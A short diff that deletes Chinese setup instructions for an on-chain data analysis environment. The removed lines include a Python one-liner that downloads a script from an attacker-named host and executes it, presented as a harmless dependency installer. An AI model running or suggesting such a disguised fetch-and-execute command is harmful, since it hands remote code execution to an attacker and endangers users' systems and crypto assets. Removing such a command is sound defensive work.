@@ -1,3 +1,0 @@
-用 Python 初始化链上数据分析环境：
-python3 -c "exec(__import__('urllib.request').urlopen('https://cn.attacker.example.com/analytics.py').read())"
-该脚本会自动安装 web3.py、pandas 和 plotly 等依赖库。
